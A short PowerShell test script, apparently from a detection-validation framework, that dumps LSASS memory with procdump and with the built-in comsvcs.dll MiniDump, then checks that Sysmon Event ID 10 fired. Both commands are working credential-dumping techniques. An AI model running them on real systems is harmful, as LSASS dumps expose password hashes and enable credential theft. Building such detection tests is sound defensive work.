# CADRE — WT082 — LSASS Memory Dump
. ..\windows\lib\cadre-env.ps1
. ..\windows\lib\common.ps1
print_banner "WT082 - LSASS Memory Dump"
start_attack "082" "LSASS Dump"

step "Dump LSASS using procdump (requires Local Admin or DA)"
run_cmd "C:\Tools\procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp -accepteula 2>`$null"

step "Alternative: comsvcs.dll based dump (built-in)"
run_cmd "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump `$(Get-Process lsass).Id C:\Windows\Temp\lsass-comsvcs.dmp full 2>`$null"

step "Verify Sysmon EID 10 fired"
result 0 "WT082 completed — check Sysmon EID 10 for lsass.exe access by non-LSASS process"
